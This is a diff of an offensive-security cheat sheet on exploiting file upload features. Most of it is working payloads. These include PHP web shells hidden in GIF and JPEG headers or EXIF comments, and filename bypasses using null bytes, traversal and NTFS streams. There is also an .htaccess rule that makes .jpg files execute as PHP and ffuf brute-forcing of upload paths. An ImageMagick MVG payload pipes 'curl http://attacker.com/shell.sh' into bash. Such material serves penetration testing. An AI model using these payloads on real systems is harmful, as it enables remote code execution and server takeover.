@@ -6,10 +6,7 @@
 
 ## Testing Approach
 
-```
-Goal: Upload a file that executes server-side code,
-      or access files other users uploaded.
-```
+Goal: Upload a file that executes server-side code, or access files other users uploaded.
 
 ---
 
@@ -46,10 +43,10 @@ shell.php\x00.jpg
 ../../shell.php
 ../../../var/www/html/shell.php
 
-# Double dot bypass
+# Double dot
 shell.php.
 
-# Windows NTFS alternate data streams
+# Windows NTFS alternate data stream
 shell.php::$DATA
 ```
 
@@ -67,7 +64,7 @@ Content-Type: image/gif
 GIF89a
 <?php system($_GET['cmd']); ?>
 
-# Image with embedded PHP
+# Image with embedded PHP via exiftool
 exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
 mv image.jpg shell.php.jpg
 ```
@@ -76,16 +73,18 @@ mv image.jpg shell.php.jpg
 
 ## Magic Bytes Reference
 
-| Type | Magic Bytes (Hex) | ASCII |
-|------|-------------------|-------|
-| JPEG | FF D8 FF | ÿØÿ |
-| PNG | 89 50 4E 47 | .PNG |
-| GIF | 47 49 46 38 | GIF8 |
-| PDF | 25 50 44 46 | %PDF |
-| ZIP | 50 4B 03 04 | PK.. |
+**JPEG** — hex `FF D8 FF` — ASCII `ÿØÿ`
+
+**PNG** — hex `89 50 4E 47` — ASCII `.PNG`
+
+**GIF** — hex `47 49 46 38` — ASCII `GIF8`
+
+**PDF** — hex `25 50 44 46` — ASCII `%PDF`
+
+**ZIP** — hex `50 4B 03 04` — ASCII `PK..`
 
 ```bash
-# Prepend magic bytes to PHP shell
+# Prepend JPEG magic bytes to PHP shell
 printf '\xFF\xD8\xFF' > shell.php
 echo '<?php system($_GET["cmd"]); ?>' >> shell.php
 ```
@@ -95,16 +94,14 @@ echo '<?php system($_GET["cmd"]); ?>' >> shell.php
 ## Finding the Upload Path
 
 ```bash
-# Check response for file path
-# Check X-File-Path header
+# Check response body / headers for file path
 # Check JSON response: {"url": "/uploads/abc123.jpg"}
 
-# If path not disclosed:
-# Common upload directories
+# If path not disclosed — brute force common dirs
 ffuf -u https://target.com/FUZZ/shell.php \
   -w upload_dirs.txt -mc 200
 
-# Common paths:
+# Common upload paths
 /uploads/, /files/, /media/, /images/, /assets/,
 /content/, /static/uploads/, /user_uploads/
 ```
@@ -114,11 +111,11 @@ ffuf -u https://target.com/FUZZ/shell.php \
 ## .htaccess Upload (Apache)
 
 ```bash
-# Upload .htaccess to allow PHP execution in upload dir
-# File: .htaccess
+# Upload .htaccess to allow PHP execution in upload directory
+# File contents:
 AddType application/x-httpd-php .jpg
 
-# Then upload shell.jpg and access it as PHP
+# Then upload shell.jpg — it executes as PHP
 ```
 
 ---
@@ -127,11 +124,9 @@ AddType application/x-httpd-php .jpg
 
 ```bash
 # If server uses ImageMagick to process images
-# MVG polyglot
+# Save as exploit.mvg or exploit.svg and upload
 push graphic-context
 viewbox 0 0 640 480
 fill 'url(https://127.0.0.1/image.jpg"|curl http://attacker.com/shell.sh | bash")'
 pop graphic-context
-
-# Save as exploit.mvg or exploit.svg and upload
 ```
